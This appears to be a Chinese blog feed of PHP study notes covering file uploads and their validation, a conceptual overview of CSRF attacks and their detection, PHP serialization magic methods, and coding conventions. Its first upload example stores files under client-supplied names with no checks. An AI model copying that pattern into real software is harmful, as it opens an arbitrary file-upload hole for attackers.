<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST)) &#123;</span><br><span class="line">	if($_FILES[&#x27;face&#x27;][&#x27;error&#x27;]==0)&#123;  //上传正确</span><br><span class="line">        //文件上传</span><br><span class="line">		move_uploaded_file($_FILES[&#x27;face&#x27;][&#x27;tmp_name&#x27;],&#x27;./&#x27;.$_FILES[&#x27;face&#x27;][&#x27;name&#x27;]);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &#x27;上传有误&#x27;;</span><br><span class="line">		echo &#x27;错误码:&#x27;.$_FILES[&#x27;face&#x27;][&#x27;error&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;face&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>小结：上传的同名的文件要给覆盖</p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行文件上传，上传后的文件保存在当前目录下文件名为 upload 的文件夹下</span><br><span class="line">并且打印该文件所有信息。（文件名、类型、大小、临时存放的位置、错误信息（通过错误编码蛇者））</span><br></pre></td></tr></table></figure>









<h4 id="1-6-4-与文件上传有关的配置"><a href="#1-6-4-与文件上传有关的配置" class="headerlink" title="1.6.4  与文件上传有关的配置"></a>1.6.4  与文件上传有关的配置</h4><p>post_max_size &#x3D; 8M：表单允许的最大值</p>
<p>upload_max_filesize &#x3D; 2M：允许上传的文件大小</p>
<p>upload_tmp_dir &#x3D;F:\wamp\tmp：指定临时文件地址，如果不知道操作系统指定</p>
<p>file_uploads &#x3D; On：是否允许文件上传</p>
<p>max_file_uploads &#x3D; 20：允许同时上传20个文件</p>
<h2 id="1-7-优化文件上传"><a href="#1-7-优化文件上传" class="headerlink" title="1.7  优化文件上传"></a>1.7  优化文件上传</h2><h4 id="1-7-1-更改文件名"><a href="#1-7-1-更改文件名" class="headerlink" title="1.7.1  更改文件名"></a>1.7.1  更改文件名</h4><p>方法一：通过时间戳做文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&#x27;face.stu.jpg&#x27;</span>;</span><br><span class="line"><span class="comment">//echo strrchr($path,&#x27;.&#x27;);	//从最后一个点开始截取，一直截取到最后</span></span><br><span class="line"><span class="comment">//echo strchr($path,&#x27;.&#x27;);	//从第一个点开始截取，一直截取到最后</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">999</span>).<span class="title function_ invoke__">strrchr</span>(<span class="variable">$path</span>,<span class="string">&#x27;.&#x27;</span>);   </span><br></pre></td></tr></table></figure>





<p>方法二：通过uniqid()实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path</span>=<span class="string">&#x27;face.stu.jpg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">strrchr</span>(<span class="variable">$path</span>,<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;   <span class="comment">//生成唯一的ID</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;goods_&#x27;</span>).<span class="title function_ invoke__">strrchr</span>(<span class="variable">$path</span>,<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;   <span class="comment">//带有前缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;goods_&#x27;</span>,<span class="literal">true</span>).<span class="title function_ invoke__">strrchr</span>(<span class="variable">$path</span>,<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">//唯一ID+随机数</span></span><br></pre></td></tr></table></figure>



<h4 id="1-7-2-验证文件格式"><a href="#1-7-2-验证文件格式" class="headerlink" title="1.7.2  验证文件格式"></a>1.7.2  验证文件格式</h4><p>方法一：判断文件的扩展名（不能识别文件伪装）</p>
<p>操作思路：将文件的后缀和允许的后缀对比</p>
<p>in_array($ext,$allow)    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST)) &#123;</span><br><span class="line">	$allow=array(&#x27;.jpg&#x27;,&#x27;.png&#x27;,&#x27;.gif&#x27;);	//允许的扩展名</span><br><span class="line">	$ext=strrchr($_FILES[&#x27;face&#x27;][&#x27;name&#x27;],&#x27;.&#x27;);  //上传文件扩展名</span><br><span class="line">	if(in_array($ext,$allow))</span><br><span class="line">		echo &#x27;允许上传&#x27;;</span><br><span class="line">	else</span><br><span class="line">		echo &#x27;文件不合法&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;face&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>注意：比较扩展名不能防止文件伪装。</p>
<p>方法二：通过<code>$_FIELS[][&#39;type&#39;]</code>类型（不能识别文件伪装）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST)) &#123;</span><br><span class="line">	$allow=array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);	//允许的类别</span><br><span class="line">	$mime=$_FILES[&#x27;face&#x27;][&#x27;type&#x27;];  //上传文件类型</span><br><span class="line">	if(in_array($mime,$allow))</span><br><span class="line">		echo &#x27;允许上传&#x27;;</span><br><span class="line">	else</span><br><span class="line">		echo &#x27;文件不合法&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;face&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>注意：比较<code>$_FIELS[][&#39;type&#39;]</code>不能防止文件伪装。</p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">做一个优化。既判断后缀、同时也会判断类型。并且将他们各自封装为函数（判断后缀、判断类型）。 </span><br><span class="line">文件上传后，直接对函数进行调用</span><br></pre></td></tr></table></figure>



<p>方法三：php_fileinfo扩展（可以防止文件伪装）</p>
<p>​	在php.ini中开启fileinfo扩展</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extension=php_fileinfo.dll</span><br></pre></td></tr></table></figure>

<p>注意：开启fileinfo扩展以后，就可以使用finfo_*的函数了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST)) &#123;</span><br><span class="line">	//第一步：创建finfo资源</span><br><span class="line">	$info=finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">	//var_dump($info);		//resource(2) of type (file_info) </span><br><span class="line">	//第二步：将finfo资源和文件做比较</span><br><span class="line">	$mime=finfo_file($info,$_FILES[&#x27;face&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">	//第三步，比较是否合法</span><br><span class="line">	$allow=array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);	//允许的类别</span><br><span class="line">	echo in_array($mime,$allow)?&#x27;合法&#x27;:&#x27;不合法&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;face&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>小结：验证文件格式有三种方法</p>
<p>1、可以验证扩展名（不可以防止文件伪装）</p>
<p>2、通过<code>$_FILES[][&#39;type&#39;]</code>验证（不可以防止文件伪装）</p>
<p>3、通过file_info扩展（可以防止文件伪装）</p>
<h4 id="1-7-3-优化文件上传例题"><a href="#1-7-3-优化文件上传例题" class="headerlink" title="1.7.3  优化文件上传例题"></a>1.7.3  优化文件上传例题</h4><p>步骤</p>
<p>第一步：验证是否有误</p>
<p>第二步：验证格式</p>
<p>第三步：验证大小</p>
<p>第四步：验证是否是http上传</p>
<p>第五步：上传实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">*验证错误</span><br><span class="line">*如果有错，就返回错误，如果没错，就返回null</span><br><span class="line">*/</span><br><span class="line">function check($file) &#123;</span><br><span class="line">	//1：验证是否有误</span><br><span class="line">	if($file[&#x27;error&#x27;]!=0)&#123;</span><br><span class="line">		switch($file[&#x27;error&#x27;]) &#123;</span><br><span class="line">			case 1:</span><br><span class="line">				return &#x27;文件大小超过了php.ini中允许的最大值,最大值是：&#x27;.ini_get(&#x27;upload_max_filesize&#x27;);</span><br><span class="line">			case 2:</span><br><span class="line">				return &#x27;文件大小超过了表单允许的最大值&#x27;;</span><br><span class="line">			case 3:</span><br><span class="line">				return &#x27;只有部分文件上传&#x27;;</span><br><span class="line">			case 4:</span><br><span class="line">				return &#x27;没有文件上传&#x27;;</span><br><span class="line">			case 6:</span><br><span class="line">				return &#x27;找不到临时文件&#x27;;</span><br><span class="line">			case 7:</span><br><span class="line">				return &#x27;文件写入失败&#x27;;</span><br><span class="line">			default:</span><br><span class="line">				return &#x27;未知错误&#x27;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//2、验证格式</span><br><span class="line">	$info=finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">	$mime=finfo_file($info,$file[&#x27;tmp_name&#x27;]);</span><br><span class="line">	$allow=array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);	//允许的类别</span><br><span class="line">	if(!in_array($mime,$allow))&#123;</span><br><span class="line">		return &#x27;只能上传&#x27;.implode(&#x27;,&#x27;,$allow).&#x27;格式&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	//3、验证大小</span><br><span class="line">	$size=123456789;</span><br><span class="line">	if($file[&#x27;size&#x27;]&gt;$size)&#123;</span><br><span class="line">		return &#x27;文件大小不能超过&#x27;.number_format($size/1024,1).&#x27;K&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	//4、验证是否是http上传</span><br><span class="line">	if(!is_uploaded_file($file[&#x27;tmp_name&#x27;]))</span><br><span class="line">		return &#x27;文件不是HTTP POST上传的&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">	return null;  //没有错误</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//表单提交</span><br><span class="line">if(!empty($_POST)) &#123;</span><br><span class="line">	//上传文件过程中有错误就显示错误</span><br><span class="line">	if($error=check($_FILES[&#x27;face&#x27;]))&#123;</span><br><span class="line">		echo $error;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//文件上传，上传的文件保存到当天的文件夹中</span><br><span class="line">		$foldername=date(&#x27;Y-m-d&#x27;);		//文件夹名称</span><br><span class="line">		$folderpath=&quot;./uploads/&#123;$foldername&#125;&quot;;	//文件夹路径</span><br><span class="line">		if(!is_dir($folderpath))</span><br><span class="line">			mkdir($folderpath);</span><br><span class="line">		$filename=uniqid(&#x27;&#x27;,true).strrchr($_FILES[&#x27;face&#x27;][&#x27;name&#x27;],&#x27;.&#x27;);	//文件名</span><br><span class="line">		$filepath=&quot;$folderpath/$filename&quot;;	//文件路径</span><br><span class="line">		if(move_uploaded_file($_FILES[&#x27;face&#x27;][&#x27;tmp_name&#x27;],$filepath))</span><br><span class="line">			echo &quot;上传成功,路径是：&#123;$foldername&#125;/&#123;$filename&#125;&quot;;</span><br><span class="line">		else</span><br><span class="line">			echo &#x27;上传失败&lt;br&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;face&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>小结：</p>
<p>1、将时间戳转换格式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="number">1231346</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//将时间戳转成年-月-日 小时:分钟:秒</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//将当前的时间转成年-月-日 小时:分钟:秒</span></span><br></pre></td></tr></table></figure>

<p>2、设置时区（php.ini）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PRC：中华人民共和国</span><br></pre></td></tr></table></figure>



<p>3、PHP的执行可以不需要Apache的参与</p>
<h2 id="1-9-例题"><a href="#1-9-例题" class="headerlink" title="1.9  例题"></a>1.9  例题</h2><p>1、递归遍历文件夹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取文件夹的子级</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$folder</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);		<span class="comment">//打开文件夹</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$folder</span>))&#123;	<span class="comment">//读取文件夹</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$f</span>==<span class="string">&#x27;.&#x27;</span> || <span class="variable">$f</span>==<span class="string">&#x27;..&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&#x27;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="variable">$f</span>).<span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">		<span class="variable">$subpath</span>=<span class="string">&quot;<span class="subst">&#123;$path&#125;</span>/<span class="subst">&#123;$f&#125;</span>&quot;</span>;	</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$subpath</span>))	<span class="comment">//如果子级还是文件夹，继续打开并读取</span></span><br><span class="line">			<span class="title function_ invoke__">getFile</span>(<span class="variable">$subpath</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="title function_ invoke__">getFile</span>(<span class="string">&#x27;./&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>2、一只猴子看守一堆桃子，第一天吃了一半后又多吃了1个，第二天一样，到第十天的时候就剩下一个桃子，请问原来有几个桃子？</p>
<p>分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(n)-(f(n)/2+1)=f(n+1)</span><br><span class="line">=&gt;f(n)/2-1=f(n+1)</span><br><span class="line">=&gt;f(n)=(f(n+1)+1)*2</span><br></pre></td></tr></table></figure>

<p>代码实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTao</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$n</span>==<span class="number">10</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> (<span class="title function_ invoke__">getTao</span>(<span class="variable">$n</span>+<span class="number">1</span>)+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getTao</span>(<span class="number">1</span>);    <span class="comment">//1534</span></span><br></pre></td></tr></table></figure>











]]></content>
  </entry>
  <entry>
    <title>csrf漏洞</title>
    <url>/2023/04/20/csrf%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="csrf简介"><a href="#csrf简介" class="headerlink" title="csrf简介"></a>csrf简介</h1><p>CSRF(Cross Site Request Forgery)，中文名称跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>1、a登录某银行网站，于是浏览器生成了a在该银行的的身份验证信息。</p>
<p>2、b利用Sns.com服务器将伪造的转账请求包含在帖子中，并把帖子链接发给了a。</p>
<p>3、a在银行网站保持登录的情况下浏览帖子</p>
<p>4、这时a就在不知情的情况下将伪造的转账请求连同身份认证信息发送到银行网站。</p>
<p>5、银行网站看到身份认证信息，认为请求是a的合法操作</p>
<p>之后，银行网站会报据a的权限来处理b所发起的恶意请求，这样b就达到了伪造a的身份请求银行网站给自己转账的目的。</p>
<p>在此过程中受害者a只需要做下面两件事情，攻击者b就能够完成CSRF攻击：</p>
<p>1.登录受信任银行网站，并生成身份验证信息；</p>
<p>2.在不登出银行网站(清除身份验证信息)的情况下，访问恶意站点Sns.com。</p>
<h2 id="CSRF攻击分类"><a href="#CSRF攻击分类" class="headerlink" title="CSRF攻击分类"></a>CSRF攻击分类</h2><p>CSRF漏洞一般分为站外和站内两种类型。</p>
<p>CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的，一些敏感的操作本来是要求用户从表单提交发起POST请求传参给程序，但是由于使用了$_REQUEST等变量，程序也接收GET请求传参，这样就给攻击者使用CSRF攻击创造了条件，一般攻击者只要把预测好的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起请求。</p>
<p>CSRF站外类型的漏洞其实就是传统意义上的外部提交数据问题，一般程序员会考虑给一些留言评论等的表单加上水印以防止SPAM问题，但是为了用户的体验性，一些操作可能没有做任何限制，所以攻击者可以先预测好请求的参数，在站外的Web页面里编写javascript脚本伪造文件请求或和自动提交的表单来实现GET、POST请求，用户在会话状态下点击链接访问站外的Web页面，客户端就被强迫发起请求。</p>
<p>CSRF最初的一个错误观点，认为CSRF只能有GET请求发起，因此一些开发者认为只要把重要的操作改为只允许POST请求就能防CSRF</p>
<p>对于很多网站来说，即使是一些重要的操作使用POST来提交请求，但是服务端在接受请求的时候未严格的区分GET和POST。攻击者依然可以用GET来请求表单的提交地址。</p>
<p>比如在PHP中，如果使用的是$_REQUEST,而$_REQUEST既可以接受GET请求也可以接受POST请求。</p>
<p>如果服务端已经区分了GET和POST,只用$_POST来接收请求数据。最简单的方法就是在攻击页面构造好一个form表单，然后用javascript自动提交这个表单。</p>
<h2 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h2><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Refexex字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>随着对CSRF漏洞研究的不断深入，不断涌现出一些专[门针对CSRF漏洞进行检测的工具,如CSRFTester, CSRF Request Builder等。</p>
<p>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
<p>冒充身份：订阅&#x2F;关注&#x2F;转发&#x2F;投票操作，删除文件，更改配置等</p>
<p>帐户接管：密码修改，邮箱绑定，第三方帐户关联</p>
<p>其他：登录&#x2F;注册&#x2F;注销&#x2F;注册</p>
<p>安全设计原则：CSRF登录后令牌未更新、登出后未注销等</p>
<h2 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h2><p>token验证</p>
]]></content>
  </entry>
  <entry>
    <title>php序列化漏洞</title>
    <url>/2023/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、什么是序列化"><a href="#一、什么是序列化" class="headerlink" title="一、什么是序列化"></a>一、什么是序列化</h1><p>序列化是将变量转换为可保存或传输的字符串的过程:反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。简单来说就是将一大段对象压缩成字符串</p>
<p>例如，可以序列化一个对象，然后使用 HTTP 通过 Internet 在客户端和服务器之间传输该对象，或者和其它应用程序共享使用。反之，反序列化根据流重新构造对象</p>
<h1 id="二、常用魔术常量"><a href="#二、常用魔术常量" class="headerlink" title="二、常用魔术常量"></a>二、常用魔术常量</h1><table>
<thead>
<tr>
<th>__construct()</th>
<th align="center">类的构造函数</th>
</tr>
</thead>
<tbody><tr>
<td>__destruct()</td>
<td align="center">类的析构函数</td>
</tr>
<tr>
<td>__call()</td>
<td align="center">在对象中调用一个不可访问方法时调用</td>
</tr>
<tr>
<td>__callStatic(</td>
<td align="center">用静态方式中调用一个不可访问方法时调用</td>
</tr>
<tr>
<td>__get()</td>
<td align="center">获得一个类的成员变量时调用</td>
</tr>
<tr>
<td>__set()</td>
<td align="center">设置一个类的成员变量时调用</td>
</tr>
<tr>
<td>__isset()</td>
<td align="center">当对不可访问属性调用isset()或empty()时调用</td>
</tr>
<tr>
<td>__unset()</td>
<td align="center">当对不可访问属性调用unset()时被调用</td>
</tr>
<tr>
<td>__sleep()</td>
<td align="center">执行serialize()时，先会调用这个函数</td>
</tr>
<tr>
<td>__wakeup()</td>
<td align="center">执行unserialize()时，先会调用这个函数</td>
</tr>
<tr>
<td>__toString()</td>
<td align="center">类被当成字符串时的回应方法</td>
</tr>
<tr>
<td>__invoke()</td>
<td align="center">调用函数的方式调用一个对象时的回应方法</td>
</tr>
<tr>
<td>__set_state()</td>
<td align="center">调用var_export()导出类时，此静态方法会被调用</td>
</tr>
<tr>
<td>__clone()</td>
<td align="center">当对象复制完成时调用</td>
</tr>
<tr>
<td>__autoload()</td>
<td align="center">尝试加载未定义的类</td>
</tr>
<tr>
<td>__debugInfo()</td>
<td align="center">打印所需调试信息·</td>
</tr>
</tbody></table>
<p>重点关注魔术方法</p>
<p>__construct：构造函数，当一个对象创建时调用</p>
<p>__destruct：析构函数，当一个对象被销毁时调用</p>
<p>__toString：当一个对象被当作一个字符串时使用</p>
<p>__sleep：在对象序列化的时候调用</p>
<p>__wakeup：对象重新醒来，即由二进制串重新组成一个对象的时候（在一个对象被反序列化时调用）</p>
<p>从序列化到反序列化执行流程：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>() --&gt; <span class="title function_ invoke__">__sleep</span>() --&gt; <span class="title function_ invoke__">__wakeup</span>() --&gt; <span class="title function_ invoke__">__toString</span>() --&gt; <span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//一个变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;Tom&#x27;</span>;</span><br><span class="line">    <span class="comment">//一个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//析构函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destruct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//当对象被当作一个字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;__toString&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="comment">//__construct会被调用</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//创建一个方法</span></span><br><span class="line"><span class="comment">//‘This is a string’将会被输出</span></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="comment">//对象被当作一个字符串</span></span><br><span class="line"><span class="comment">//toString会被调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//php脚本要结束时，__destruct会被调用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct</span><br><span class="line">Tom</span><br><span class="line">__toString</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure>



<h1 id="三、序列化字符解释"><a href="#三、序列化字符解释" class="headerlink" title="三、序列化字符解释"></a>三、序列化字符解释</h1><p><img src="D:\Downloads\Typicture\image-20230426191347207.png" alt="image-20230426191347207"></p>
]]></content>
  </entry>
  <entry>
    <title>PHP开发基础小结</title>
    <url>/2023/04/20/PHP%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//语法错误（syntax error）在语法分析阶段，源代码并未被执行，故不会有任何输出。</span><br><span class="line"></span><br><span class="line">/* 【命名规则】 */</span><br><span class="line">常量名 类常量建议全大写，单词间用下划线分隔    // MIN_WIDTH</span><br><span class="line">变量名建议用下划线方式分隔            // $var_name</span><br><span class="line">函数名建议用驼峰命名法                // varName</span><br><span class="line">定界符建议全大写                 // &lt;&lt;&lt;DING, &lt;&lt;&lt;&#x27;DING&#x27;</span><br><span class="line">文件名建议全小写和下划线、数字        // func_name.php</span><br><span class="line">私有属性名、方法名建议加下划线        // private $_name _func</span><br><span class="line">接口名建议加I_                    // interface I_Name</span><br><span class="line"> </span><br><span class="line">/* 语言结构 */</span><br><span class="line">array(), echo(), empty(), eval(), exit(), isset(), list(), print(), unset()</span><br><span class="line">echo, print 可省略括号。</span><br><span class="line"> </span><br><span class="line">/* 预定义常量 */</span><br><span 